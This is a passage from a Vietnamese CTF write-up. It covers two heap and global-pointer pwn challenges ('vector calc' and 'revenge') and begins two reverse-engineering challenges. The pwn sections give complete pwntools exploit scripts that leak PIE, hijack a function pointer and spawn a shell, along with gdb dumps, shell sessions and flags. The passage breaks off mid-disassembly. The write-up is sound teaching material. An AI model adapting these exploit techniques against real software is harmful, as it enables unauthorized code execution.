y biến con trỏ sum chứa 1 struct của mảng v_list với 2 chỉ số x, y trên heap tại index mà ta nhập vào -\u0026gt; như đã phân tích trên, chương trình chỉ đơn giản có 6 chức năng, ta tiến hành tìm bug để thực hiện khai thác\nnhìn qua thì có vẻ không có bug gì, nhưng fuzz 1 hồi, mình để ý là ở hàm enterdata(), chương trình thực hiện check index của mình nhập vào, nhưng lại không check khi index bằng 3 -\u0026gt; dẫn tới lỗi oob, dựa vào đó ta có thể ghi đè biến sum các địa chỉ hợp lí để có thể khai thác\nmình tiến hành debug bằng gdb() để kiểm tra thật sự là mình có thể ghi đè biến sum không, và sau đây là kết quả khi mình nhập index 3:\n09:0048│ 0x555555558088 (sum) ◂— 0xdeadbeef 0a:0050│ 0x555555558090 ◂— 0xdeadbeef 0b:0058│ 0x555555558098 —▸ 0x55555555535d (printdata) ◂— endbr64 -\u0026gt; thật sự, mình có thể ghi đè biến sum, đây là mấu chốt quan trọng để mình thực hiện các bước tiếp theo\nnhưng để viết vào biến sum 1 địa chỉ hợp lệ thì trước hết ta phải cần có địa chỉ base của pie, và cũng có thể leak địa chỉ libc() base nếu chúng ta không có địa chỉ của hàm nào thật sự exploit được trong binary.\nvà may mắn thay, mình tìm thấy trong file binary có hàm w1n()\nint w1n() { return system(\u0026#34;/bin/sh 1\u0026gt;/dev/null\u0026#34;); } -\u0026gt; ta không cần phải leak libc và chúng ta có thể điều khiển 1 con trỏ hàm tới đây để có shell :\u0026raquo;\u0026gt;\nvậy, làm sao để leak pie??\nsau 1 hồi lâu mò mẫm thì mình cũng tìm được 1 bug khá là hay trong hàm loadfavorite() để có thể leak pie !\ncùng nhìn lại hàm loadfavorite():\nfaves[idx] = malloc(sizeof(struct vector)); ((struct vector *)faves[idx])-\u0026gt;printfunc = printdata; memcpy(faves[idx],\u0026amp;sum[idx], sizeof(struct vector)); nếu index=2, nếu biến sum đang chứa địa chỉ của struct thứ 2 trong mảng v_list -\u0026gt; \u0026amp;sum[2] -\u0026gt; v_list+64 hay là \u0026amp;sum[2]-\u0026gt;v_list[8] và khi thực hiện memcpy() thì trên chunk faves[2] sẽ chứa địa chỉ hàm print trên chỉ số x và địa chỉ của v_list[2] trên chỉ số y của chunk faves[2]\nhiện thực hóa điều trên:\n00:0000│ 0x555555558040 (v_list) ◂— 0xdeadbeef 01:0008│ 0x555555558048 (v_list+8) ◂— 0xdeadbeef 02:0010│ 0x555555558050 (v_list+16) —▸ 0x55555555535d (printdata) ◂— endbr64 03:0018│ 0x555555558058 (v_list+24) ◂— 0xdeadbeef 04:0020│ 0x555555558060 (v_list+32) ◂— 0xdeadbeef 05:0028│ 0x555555558068 (v_list+40) —▸ 0x55555555535d (printdata) ◂— endbr64 06:0030│ 0x555555558070 (v_list+48) ◂— 0xdeadbeef 07:0038│ 0x555555558078 (v_list+56) ◂— 0xdeadbeef 08:0040│ 0x555555558080 (v_list+64) —▸ 0x55555555535d (printdata) ◂— endbr64 09:0048│ 0x555555558088 (sum) —▸ 0x555555558070 (v_list+48) ◂— 0xdeadbeef -\u0026gt; trên *faves[2] đã chứa các địa chỉ mà ta cần\n0:0000│ 0x5555555592a0 —▸ 0x55555555535d (printdata) ◂— endbr64 01:0008│ 0x5555555592a8 —▸ 0x555555558070 (v_list+48) ◂— 0x37ab6fbbc 02:0010│ 0x5555555592b0 ◂— 0x0 -\u0026gt; từ đó, khi ta dùng hàm printfavorite() thì thứ chúng ta có được đó là địa chỉ của mảng v_list và địa chỉ của hàm print là ta sẽ có được địa chỉ của pie\nindex: 2 data: v = [93824992236381 93824992247920] -\u0026gt; thành công leak được pie base\nbây giờ, ta đã có pie base, điều cần làm là làm sao điều khiển được rip trỏ vào hàm w1n()\noptions 3 sẽ trả lời câu hỏi của ta:\n((struct vector *)sum)-\u0026gt;printfunc(sum);\nchúng ta có thể điều khiển biến sum trỏ vào bất cứ đâu nhờ vào bug oob ở trên\nvậy thì chúng ta sẽ viết hàm w1n() vào 1 index nào đó trên v_list() rồi ghi đè sum trỏ vào trước đó 16 bytes thì chúng ta đã có thể có được shell !!!!!\n00:0000│ 0x558c60655040 (v_list) —▸ 0x558c606529d2 (w1n) ◂— endbr64 01:0008│ 0x558c60655048 (v_list+8) —▸ 0x558c606529d2 (w1n) ◂— endbr64 02:0010│ 0x558c60655050 (v_list+16) —▸ 0x558c6065235d (printdata) ◂— endbr64 lúc này ghi đè sum bằng v_list[3] thành v_list-16 sau đó trigger để gọi hàm w1n\n0x558c6065298c \u0026lt;main+173\u0026gt; call rdx \u0026lt;w1n\u0026gt; rdi: 0x558c60655030 (stdin@glibc_2.2.5) —▸ 0x7fdff7ff6aa0 (_io_2_1_stdin_) ◂— 0xfbad208b rsi: 0x3 rdx: 0x558c606529d2 (w1n) ◂— endbr64 rcx: 0x0 vậy là trên local mình đã exploit thành công, mình tiến hành gửi lên server thông qua script sau: vector exploit: xpl.py\nfrom pwn import * #context.log_level=\u0026#39;debug\u0026#39; io=process(\u0026#39;./chall\u0026#39;) #io=remote(\u0026#39;45.122.249.68\u0026#39;, 20017) elf=context.binary=elf(\u0026#39;./chall\u0026#39;) #gdb.attach(io) def enter(idx, x, y): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) io.sendlineafter(b\u0026#39;index: \u0026#39;, idx) io.sendlineafter(b\u0026#39;enter x: \u0026#39;, x) io.sendlineafter(b\u0026#39;enter y: \u0026#39;, y) def sumvector(idx): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;save the sum to index: \u0026#39;, idx) def printsum(): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;3\u0026#39;) def loadfav(idx): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;4\u0026#39;) io.sendlineafter(b\u0026#39;index\u0026#39;, idx) def printfav(idx): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;5\u0026#39;) io.sendlineafter(b\u0026#39;index\u0026#39;, idx) def addfav(idx): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;6\u0026#39;) io.sendlineafter(b\u0026#39;index\u0026#39;, idx) enter(b\u0026#39;0\u0026#39;, b\u0026#39;1\u0026#39;, b\u0026#39;1\u0026#39;) enter(b\u0026#39;1\u0026#39;, b\u0026#39;1\u0026#39;, b\u0026#39;1\u0026#39;) enter(b\u0026#39;2\u0026#39;, b\u0026#39;1\u0026#39;, b\u0026#39;1\u0026#39;) sumvector(b\u0026#39;2\u0026#39;) loadfav(b\u0026#39;2\u0026#39;) printfav(b\u0026#39;2\u0026#39;) io.recvuntil(b\u0026#39;v = [\u0026#39;) leak=io.recvline().strip(b\u0026#39;]\\n\u0026#39;).split() # print(leak) pie=int(leak[0])-0x35d log.info(\u0026#39;pie_base :\u0026#39; + hex(pie)) v_list=int(leak[1])-48 log.info(\u0026#39;v_list array :\u0026#39; + hex(v_list)) sum=v_list+64 faves=sum+0x18 log.info(\u0026#39;sum :\u0026#39; + hex(sum)) log.info(\u0026#39;faves :\u0026#39; + hex(faves)) w1n=pie+0x0000000000009d2 system=pie+0x100 log.info(\u0026#39;w1n :\u0026#39; + hex(w1n)) log.info(\u0026#39;system :\u0026#39; + hex(system)) enter(b\u0026#39;0\u0026#39;, str(w1n).encode(), str(w1n).encode()) enter(b\u0026#39;3\u0026#39;,str(v_list-16).encode(), str(v_list-16).encode()) printsum() # trigger #io.sendline(b\u0026#39;exec 1\u0026gt;\u0026amp;0\u0026#39;) io.interactive() spawn shell \u0026amp; get flag:\n─   ~/ctf/wannagame/calc  02:52:23 ─╮ ╰─❯ python3 xpl.py ─╯ [+] opening connection to 45.122.249.68 on port 20017: done [*] \u0026#39;/home/w1n-gl0ry/ctf/wannagame/calc/chall\u0026#39; arch: amd64-64-little relro: full relro stack: canary found nx: nx enabled pie: pie enabled [*] pie_base :0x55a8e7c74000 [*] v_list array :0x55a8e7c77040 [*] sum :0x55a8e7c77080 [*] faves :0x55a8e7c77098 [*] w1n :0x55a8e7c749d2 [*] system :0x55a8e7c74100 [*] switching to interactive mode $ exec 1\u0026gt;\u0026amp;0 $ id uid=1000(user) gid=1000(user) groups=1000(user) $ cd /home/user $ ls chall flag-fe1e4f5e9309c30148cdbb9349cc329eda4186949b59d42041340a5e4657f38a.txt $ cat flag-fe1e4f5e9309c30148cdbb9349cc329eda4186949b59d42041340a5e4657f38a.txt w1{ooops,... pointers, uint64_t, long long, what the heck are they?} -\u0026gt; flag: w1{ooops,... pointers, uint64_t, long long, what the heck are they?}\n2. vector_calc revenge host: nc 45.122.249.68 20018\ndescription: i have fixed the w1n function :)\nchall file: chall_revenge\nchall_revenge.c\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #define max_faves 4 #define max_vectors 3 struct vector{ __uint64_t x; __uint64_t y; void (*printfunc)(struct vector*); }; struct vector v_list[max_vectors]; __uint64_t* sum; void* faves[max_faves]; void printdata(struct vector* v); void enterdata(){ struct vector* v; __uint64_t idx; printf(\u0026#34;index: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;,\u0026amp;idx); if(idx \u0026gt; max_vectors){ puts(\u0026#34;invaild index!\u0026#34;); exit(-1); } v = \u0026amp;v_list[idx]; v-\u0026gt;printfunc = printdata; printf(\u0026#34;enter x: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;,\u0026amp;v-\u0026gt;x); printf(\u0026#34;enter y: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;,\u0026amp;v-\u0026gt;y); } void printdata(struct vector* v){ puts(\u0026#34;data: \u0026#34;); printf(\u0026#34;v = [%lu %lu]\\n\u0026#34;,v-\u0026gt;x,v-\u0026gt;y); } void sumvector(){ __uint64_t idx; printf(\u0026#34;save the sum to index: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;,\u0026amp;idx); if(idx \u0026gt; max_vectors){ puts(\u0026#34;invaild index!\u0026#34;); exit(-1); } sum = \u0026amp;v_list[idx]; for(__uint64_t i = 0 ; i \u0026lt; max_vectors ;++i){ if( i != idx){ ((struct vector *)sum)-\u0026gt;x += v_list[idx].x; ((struct vector *)sum)-\u0026gt;y += v_list[idx].y; } } } void loadfavorite(){ if(sum == null){ puts(\u0026#34;you must set the sum before!\u0026#34;); return; } __uint64_t idx; printf(\u0026#34;index: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;,\u0026amp;idx); if(idx \u0026gt;= max_faves){ puts(\u0026#34;invaild index!\u0026#34;); exit(-1); } faves[idx] = malloc(sizeof(struct vector)); ((struct vector *)faves[idx])-\u0026gt;printfunc = printdata; memcpy(faves[idx],\u0026amp;sum[idx], sizeof(struct vector)); } void printfavorite(){ if(sum == null){ puts(\u0026#34;you must set the sum before!\u0026#34;); return; } __uint64_t idx; printf(\u0026#34;index: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;,\u0026amp;idx); if(idx \u0026gt;= max_faves || faves[idx] == null){ puts(\u0026#34;invaild index!\u0026#34;); exit(-1); } if( ((__uint64_t *)faves[idx])[2] ) ((struct vector *)faves[idx])-\u0026gt;printfunc(faves[idx]); else ((struct vector *)sum)-\u0026gt;printfunc(faves[idx]); } void addfavorute(){ __uint64_t idx; printf(\u0026#34;index: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;,\u0026amp;idx); if(idx \u0026gt;= max_faves || faves[idx] == null){ puts(\u0026#34;invaild index!\u0026#34;); exit(-1); } ((struct vector *)sum)-\u0026gt;x += ((struct vector *)faves[idx])-\u0026gt;x; ((struct vector *)sum)-\u0026gt;y += ((struct vector *)faves[idx])-\u0026gt;y; } void init(){ setbuf(stdin,null); setbuf(stdout,null); for(__uint64_t i = 0 ; i \u0026lt; max_vectors ;++i){ v_list[i].printfunc = printdata; } } void printmenu(){ printf( \u0026#34;\\r\\n\u0026#34; \u0026#34;1. enter data.\\n\u0026#34; \u0026#34;2. sum vector.\\n\u0026#34; \u0026#34;3. print sum vector\\n\u0026#34; \u0026#34;4. save sum to favorite\\n\u0026#34; \u0026#34;5. print favorite\\n\u0026#34; \u0026#34;6. add favorite to the sum\\n\u0026#34; \u0026#34;\u0026gt; \u0026#34; ); } int main(int argc, char** argv, char** envp){ init(); __uint32_t choice ; while(1){ printmenu(); scanf(\u0026#34;%u\u0026#34;, \u0026amp;choice); switch (choice) { case 1: enterdata(); break; case 2: sumvector(); break; case 3: ((struct vector *)sum)-\u0026gt;printfunc(sum); break; case 4: loadfavorite(); break; case 5: printfavorite(); break; case 6: addfavorute(); break; default: puts(\u0026#34;invaild option!\u0026#34;); exit(-1); } } } void w1n(); // no more valid parameters to get shell ! ở bài này, tác giả đã sửa lại hàm w1n() một chút, ở tham số truyền vào lại là echo '¯\\\\_(ツ)_/¯' nên chúng ta không thể có shell :vv\n─   ~/ctf/wannagame/calc  5s  05:04:50 ─╮ ╰─❯ python3 xpl.py ─╯ [+] opening connection to 45.122.249.68 on port 20018: done [*] \u0026#39;/home/w1n-gl0ry/ctf/wannagame/calc/chall\u0026#39; arch: amd64-64-little relro: full relro stack: canary found nx: nx enabled pie: pie enabled [*] pie_base :0x55c01873b000 [*] v_list array :0x55c01873e040 [*] sum :0x55c01873e080 [*] faves :0x55c01873e098 [*] w1n :0x55c01873b9d2 [*] system :0x55c01873b100 [*] switching to interactive mode ¯\\_(ツ)_/¯ quay lại lúc nãy, chúng ta thực thi được hàm w1n\n0x558c6065298c \u0026lt;main+173\u0026gt; call rdx \u0026lt;w1n\u0026gt; rdi: 0x558c60655030 (stdin@glibc_2.2.5) —▸ 0x7fdff7ff6aa0 (_io_2_1_stdin_) ◂— 0xfbad208b rsi: 0x3 rdx: 0x558c606529d2 (w1n) ◂— endbr64 rcx: 0x0 lúc này chúng ta cần điều khiển thanh ghi rdi trỏ đến chuỗi /bin/sh\\0 là được. lúc gọi con trỏ hàm ((struct vector *)sum)-\u0026gt;printfunc(sum) tham số của chúng ta là biến sum.\nmà sum lúc này đang trỏ đến v_list-16, do đó rdi chính xác đang trỏ đến 0x558c60655030 (stdin@glibc_2.2.5) như trên hình\nđiều chúng ta muốn bây giờ chính là rdi-\u0026gt;/bin/sh , rdx-\u0026gt; w1n\n-\u0026gt; khá là dễ dàng vì ta chỉ cần ghi vào 2 chunk trên v_list , chỉ số y của chunk này sẽ là /bin/sh, chỉ số x của chunk kế tiếp sẽ là địa chỉ hàm w1n (cách chính xác 16 bytes), ta sửa sum thành địa chỉ /bin/sh là sẽ có được shell\nmọi chuyện đã rõ ràng, ta bắt đầu thực hành:\nmình chỉnh sửa offset hàm w1n ngay chỗ thực hiện call system để tránh thanh ghi rdi được set cho giá trị rác\n00:0000│ 0x563e7ff31040 (v_list) ◂— 0x68732f6e69622f /* \u0026#39;/bin/sh\u0026#39; */ 01:0008│ rax rdi 0x563e7ff31048 (v_list+8) ◂— 0x68732f6e69622f /* \u0026#39;/bin/sh\u0026#39; */ 02:0010│ 0x563e7ff31050 (v_list+16) —▸ 0x563e7ff2e35d (printdata) ◂— endbr64 03:0018│ 0x563e7ff31058 (v_list+24) —▸ 0x563e7ff2e9e4 (w1n+18) ◂— call 0x563e7ff2e100 04:0020│ 0x563e7ff31060 (v_list+32) —▸ 0x563e7ff2e9e4 (w1n+18) ◂— call 0x563e7ff2e100 05:0028│ 0x563e7ff31068 (v_list+40) —▸ 0x563e7ff2e35d (printdata) ◂— endbr64 06:0030│ 0x563e7ff31070 (v_list+48) ◂— 0x4 07:0038│ 0x563e7ff31078 (v_list+56) ◂— 0x4 08:0040│ 0x563e7ff31080 (v_list+64) —▸ 0x563e7ff2e35d (printdata) ◂— endbr64 09:0048│ 0x563e7ff31088 (sum) —▸ 0x563e7ff31048 (v_list+8) ◂— 0x68732f6e69622f /* \u0026#39;/bin/sh\u0026#39; vậy sum -\u0026gt; v_list+8, khi gọi con trỏ hàm thì v_list+24-\u0026gt;w1n sẽ được gọi, với sum đang chứa địa chỉ chuỗi /bin/sh\n-\u0026gt; nhưng không thành công có được shell vì bị stack alignment cả local và remote\n-\u0026gt; mình thử thay thế bằng system.plt thì không dính stack aligment và thành công chiếm được shell\nsau đây là script exploit của mình vector exploit: xpl.py\nfrom pwn import * #context.log_level=\u0026#39;debug\u0026#39; #io=process(\u0026#39;./chall_revenge\u0026#39;) io=remote(\u0026#39;45.122.249.68\u0026#39;, 20018) elf=context.binary=elf(\u0026#39;./chall_revenge\u0026#39;) #gdb.attach(io) def enter(idx, x, y): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) io.sendlineafter(b\u0026#39;index: \u0026#39;, idx) io.sendlineafter(b\u0026#39;enter x: \u0026#39;, x) io.sendlineafter(b\u0026#39;enter y: \u0026#39;, y) def sumvector(idx): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;save the sum to index: \u0026#39;, idx) def printsum(): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;3\u0026#39;) def loadfav(idx): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;4\u0026#39;) io.sendlineafter(b\u0026#39;index\u0026#39;, idx) def printfav(idx): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;5\u0026#39;) io.sendlineafter(b\u0026#39;index\u0026#39;, idx) def addfav(idx): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;6\u0026#39;) io.sendlineafter(b\u0026#39;index\u0026#39;, idx) enter(b\u0026#39;0\u0026#39;, b\u0026#39;1\u0026#39;, b\u0026#39;1\u0026#39;) enter(b\u0026#39;1\u0026#39;, b\u0026#39;1\u0026#39;, b\u0026#39;1\u0026#39;) enter(b\u0026#39;2\u0026#39;, b\u0026#39;1\u0026#39;, b\u0026#39;1\u0026#39;) sumvector(b\u0026#39;2\u0026#39;) loadfav(b\u0026#39;2\u0026#39;) printfav(b\u0026#39;2\u0026#39;) io.recvuntil(b\u0026#39;v = [\u0026#39;) leak=io.recvline().strip(b\u0026#39;]\\n\u0026#39;).split() # print(leak) pie=int(leak[0])-0x35d log.info(\u0026#39;pie_base :\u0026#39; + hex(pie)) v_list=int(leak[1])-48 log.info(\u0026#39;v_list array :\u0026#39; + hex(v_list)) sum=v_list+64 faves=sum+0x18 log.info(\u0026#39;sum :\u0026#39; + hex(sum)) log.info(\u0026#39;faves :\u0026#39; + hex(faves)) w1n=pie+0x0000000000009e4 system=pie+0x100 log.info(\u0026#39;w1n :\u0026#39; + hex(w1n)) log.info(\u0026#39;system :\u0026#39; + hex(system)) bin_sh=0x68732f6e69622f enter(b\u0026#39;0\u0026#39;, str(bin_sh).encode(), str(bin_sh).encode()) enter(b\u0026#39;3\u0026#39;,str(v_list+8).encode(), str(v_list+8).encode()) # enter(b\u0026#39;1\u0026#39;, str(w1n).encode(), str(w1n).encode()) enter(b\u0026#39;1\u0026#39;, str(system).encode(), str(system).encode()) printsum() io.interactive() spawn shell \u0026amp; get flag:\n─   ~/ctf/wannagame/calc/revenge  02:51:19 ─╮ ╰─❯ python3 xpl.py ─╯ [+] opening connection to 45.122.249.68 on port 20018: done [*] \u0026#39;/home/w1n-gl0ry/ctf/wannagame/calc/revenge/chall_revenge\u0026#39; arch: amd64-64-little relro: full relro stack: canary found nx: nx enabled pie: pie enabled [*] pie_base :0x56172c10e000 [*] v_list array :0x56172c111040 [*] sum :0x56172c111080 [*] faves :0x56172c111098 [*] w1n :0x56172c10e9e4 [*] system :0x56172c10e100 [*] switching to interactive mode $ id uid=1001(user_revenge) gid=1001(user_revenge) groups=1001(user_revenge) $ cd /home/user_revenge $ ls chall_revenge flag-769f85d66029625591d2e6b1bf75c5864b134b2901fa1ef5cf49c2eece7da15a.txt $ cat flag-769f85d66029625591d2e6b1bf75c5864b134b2901fa1ef5cf49c2eece7da15a.txt w1{g00d_exploit_idea!!!} -\u0026gt; flag: w1{g00d_exploit_idea!!!}\nreverse 1. wanna-one vpn description: wanna-one private vpn needs a license key to be authorized, help me intrude their system and i will pay you a fair price!\nchall file: wanna-one-vpn\n╭─   ~/ctf/wannagame/chall  18:49:19 ─╮ ╰─❯ file wanna-one-vpn ─╯ wanna-one-vpn: elf 64-bit lsb pie executable, x86-64, version 1 (sysv), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, buildid[sha1]=bd291b1ebb7737ffcb8d0712dc093d58183f6faf, for gnu/linux 3.2.0, not stripped vì đây là file elf 64 bit (không bị stripped) nên mình load vào ida để tiến hành dịch ngược\nnhìn lướt qua assembly thì mình thấy chương trình load vào 1 mảng encrypted_flag, nhận input ta nhập vào rồi so sánh độ dài 2 mảng bằng hàm strlen()\n.text:000000000000135b mov eax, [rbp+var_200044] .text:0000000000001361 sub eax, 1 .text:0000000000001364 cdqe .text:0000000000001366 mov byte ptr [rbp+rax+buf], 0 .text:000000000000136e lea rax, [rbp+buf] .text:0000000000001375 mov rdi, rax ; s .text:0000000000001378 call _strlen .text:000000000000137d mov rbx, rax .text:0000000000001380 mov rax, cs:encrypted_flag -\u0026gt; mảng gồm các kí tự cho trước .text:0000000000001387 mov rdi, rax ; s .text:000000000000138a call _strlen .text:000000000000138f cmp rbx, rax .text:0000000000001392 jz short loc_13b2 .text:0000000000001394 lea rax, ainvalidlicense ; \u0026#34;invalid license key!\u0026#34; .text:000000000000139b mov rdi, rax ; format .text:000000000000139e mov eax, 0 .text:00000000000013a3 call _printf .text:00000000000013a8 mov edi, 1 ; status .text:00000000000013ad call _exit vậy ta phải nhập vào 1 mảng có kích thước như encrypted_flag 24 kí tự\n.rodata:0000000000002004 a8rq9vdvyesv9em db '^8rq9{vd:vyesv~9|emvph6t',0\ntiếp tục, chương trình thực hiện 1 số hành động mà mình có thể dễ dàng dịch ra được:\n.text:00000000000013be loc_13be: ; code xref: main+1bc↓j .text:00000000000013be mov rdx, cs:encrypted_flag .text:00000000000013c5 mov eax, [rbp+var_200048] .text:00000000000013cb cdqe .text:00000000000013cd add rax, rdx .text:00000000000013d0 movzx edx, byte ptr [rax] .text:00000000000013d3 mov eax, [rbp+var_200048] .text:00000000000013d9 cdqe .text:00000000000013db movzx eax, byte ptr [rbp+rax+buf] .text:00000000000013e3 xor eax, 9 .text:00000000000013e6 cmp dl, al .text:00000000000013e8 jz short loc_1408 .text:00000000000013ea lea rax, ainvalidlicense ; \u0026#34;invalid license key!\u0026#34; .text:00000000000013f1 mov rdi, rax ; format .text:00000000000013f4 mov eax, 0 .text:00000000000013f9 call _printf .text:00000000000013fe mov edi, 1 ; status .text:0000000000001403 call _exit .text:0000000000001408 ; --------------------------------------------------------------------------- .text:0000000000001408 .text:0000000000001408 loc_1408: ; code xref: main+17a↑j .text:0000000000001408 add [rbp+var_200048], 1 .text:000000000000140f .text:000000000000140f loc_140f: ; code xref: main+14e↑j .text:000000000000140f mov eax, [rbp+var_200048] .text:0000000000001415 movsxd rbx, eax .text:0000000000001418 mov rax, cs:encrypted_flag .text:000000000000141f mov rdi, rax ; s chương trình lưu từng byte của mảng encrypted_flag vào thanh ghi edx, mảng của chúng ta nhập vào cũng được load qua eax, rồi sau đó thực hiện phép xor với 9. cuối cùng kiểm tra 2 kí tự có giống nhau không ?\nđến đây đã rõ ràng rồi, mình dùng code python đơn giản sau để mô phỏng lại thuật toán trên.\nvpn.py\nenc=b\u0026#39;^8rq9{vd:vyesv~9|emvph6t\u0026#39; enc=list(enc) dec=[] for i in enc: dec.append(i^9) print(\u0026#39;\u0026#39;.join(chr(i) for i in dec)) -\u0026gt; flag: w1{x0r_m3_plz_w0uld_ya?}\n2. wanna-one vault description: hear me out, i disabled the security system so that i could easily dump the vault firmware, now help me decipher the firmware and break into the vault and steal their confidential intels.\nchall file: wanna-one-vault\n╭─   ~/ctf/wannagame/chall  12:02:49 ─╮ ╰─❯ file wanna-one-vault ─╯ wanna-one-vault: elf 64-bit lsb pie executable, x86-64, version 1 (sysv), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, buildid[sha1]=18e2d06b27d74777cea8e784139816bfb61f45d4, for gnu/linux 3.2.0, not stripped -\u0026gt; vẫn là 1 file elf 64 bit (không bị stripped), mình tiến hành load vào ida để dịch ngược\n.text:000000000000134c lea rax, [rbp+buf] .text:0000000000001353 mov edx, 30h ; \u0026#39;0\u0026#39; ; nbytes .text:0000000000001358 mov rsi, rax ; buf .text:000000000000135b mov edi, 0 ; fd .text:0000000000001360 call _read .text:0000000000001365 mov [rbp+var_2001d4], eax .text:000000000000136b cmp [rbp+var_2001d4], 0 .text:0000000000001372 jg short loc_137e .text:0000000000001374 mov edi, 1 ; status .text:0000000000001379 call _exit .text:000000000000137e ; --------------------------------------------------------------------------- .text:000000000000137e .text:000000000000137e loc_137e: ; code xref: main+104↑j .text:000000000000137e mov eax, [rbp+var_2001d4] .text:0000000000001384 sub eax, 1 .text:0000000000001387 cdqe .text:0000000000001389 mov byte ptr [rbp+rax+buf], 0 .text:0000000000001391 lea rax, [rbp+buf] .text:0000000000001398 mov rdi, rax ; s .text:000000000000139b call _strlen .text:00000000000013a0 cmp rax, 20h ; \u0026#39; \u0026#39; .text:00000000000013a4 jz short loc_13bf .text:00000000000013a6 lea rax, s ; \u0026#34;invalid vault key!\u0026#34; .text:00000000000013ad mov rdi, rax ; s .text:00000000000013b0 call _puts .text:00000000000013b5 mov edi, 1 ; status .text:00000000000013ba call _exit nhìn vào mã assembly, mảng chúng ta cần nhập vào phải chứa 0x20 kí tự và nhảy vào loc_13ce:\n.text:00000000000013ce loc_13ce: ; code xref: main+2cd↓j .text:00000000000013ce mov eax, [rbp+var_2001d8] .text:00000000000013d4 cdqe .text:00000000000013d6 movzx eax, byte ptr [rbp+rax+buf] .text:00000000000013de movsx rdx, al .text:00000000000013e2 mov eax, [rbp+var_2001d8] .text:00000000000013e8 cdqe .text:00000000000013ea mov [rbp+rax*8+var_2001d0], rdx .text:00000000000013f2 mov eax, [rbp+var_2001d8] .text:00000000000013f8 cdqe .text:00000000000013fa mov rdx, [rbp+rax*8+var_2001d0] .text:0000000000001402 mov eax, [rbp+var_2001d8] .text:0000000000001408 cdqe .text:000000000000140a xor rdx, rax .text:000000000000140d mov eax, [rbp+var_2001d8] .text:0000000000001413 cdqe .text:0000000000001415 mov [rbp+rax*8+var_2001d0], rdx .text:000000000000141d mov eax, [rbp+var_2001d8] .text:0000000000001423 cdqe .text:0000000000001425 mov rax, [rbp+rax*8+var_2001d0] .text:000000000000142d shl rax, 10h .text:0000000000001431 mov rdx, rax .text:0000000000001434 mov eax, [rbp+var_2001d8] .text:000000000000143a cdqe .text:000000000000143c mov [rbp+rax*8+var_2001d0], rdx .text:0000000000001444 mov eax, [rbp+var_2001d8] .text:000000000000144a and eax, 1 .text:000000000000144d test eax, eax .text:000000000000144f jz short loc_147c .text:0000000000001451 mov eax, [rbp+var_2001d8] .text:0000000000001457 cdqe .text:0000000000001459 mov rax, [rbp+rax*8+var_2001d0] .text:0000000000001461 xor rax, 2070h .text:0000000000001467 mov rdx, rax .text:000000000000146a mov eax, [rbp+var_2001d8] .text:0000000000001470 cdqe .text:0000000000001472 mov [rbp+rax*8+var_2001d0], rdx .text:000000000000147a jmp short loc_14a5 dễ thấy ở rbp+var_2001d8 chứa biến đếm, mình tạm đặt là idx, thực hiện 1 số phép toán đối với từng kí tự trong mảng mình nhập vào, ta thấy sau đó có chỉ thị sau:\nđầu tiên là xor từng kí tự với idx, sau đó dịch trái 0x10 shl rax, 10h -\u0026gt; val = (y ^ idx) \u0026lt;\u0026lt; 0x10\n.text:0000000000001444 mov eax, [rbp+var_2001d8] .text:000000000000144a and eax, 1 chương kiểm tra idx là chẵn hay lẻ, nếu chẵn sẽ nhảy tới loc_147c, ngược lại thì sẽ tiếp tục\nnễu idx chẵn sẽ xor giá trị val bên trên với 0x2070, còn chẵn thì sẽ tới loc_147c và xor val với 0x7020:\n.text:000000000000147c loc_147c: ; code xref: main+1e1↑j .text:000000000000147c mov eax, [rbp+var_2001d8] .text:0000000000001482 cdqe .text:0000000000001484 mov rax, [rbp+rax*8+var_2001d0] .text:000000000000148c xor rax, 7020h .text:0000000000001492 mov rdx, rax .text:0000000000001495 mov eax, [rbp+var_2001d8] .text:000000000000149b cdqe .text:000000000000149d mov [rbp+rax*8+var_2001d0], rdx .text:00000000000014a5 khái quát hóa:\nchẵn: ((y ^ idx) \u0026lt;\u0026lt; 0x10) ^ 0x7020 lẽ : ((y ^ idx) \u0026lt;\u0026lt; 0x10) ^ 0x2070 .text:00000000000014a5 loc_14a5: ; code xref: main+20c↑j .text:00000000000014a5 mov eax, [rbp+var_2001d8] .text:00000000000014ab cdqe .text:00000000000014ad mov rdx, [rbp+rax*8+var_2001d0] .text:00000000000014b5 mov eax, [rbp+var_2001d8] .text:00000000000014bb cdqe .text:00000000000014bd xor rdx, rax .text:00000000000014c0 mov eax, [rbp+var_2001d8] .text:00000000000014c6 cdqe .text:00000000000014c8 mov [rbp+rax*8+var_2001d0], rdx .text:00000000000014d0 mov eax, [rbp+var_2001d8] .text:00000000000014d6 cdqe .text:00000000000014d8 mov rdx, [rbp+rax*8+var_2001d0] .text:00000000000014e0 mov eax, [rbp+var_2001d8] .text:00000000000014e6 cdqe .text:00000000000014e8 lea rcx, ds:0[rax*8] .text:00000000000014f0 lea rax, enc_flag -\u0026gt; enc_flag array .text:00000000000014f7 mov rax, [rcx+rax] .text:00000000000014fb cmp rdx, rax .text:00000000000014fe jz short loc_1519 .text:0000000000001500 lea rax, s ; 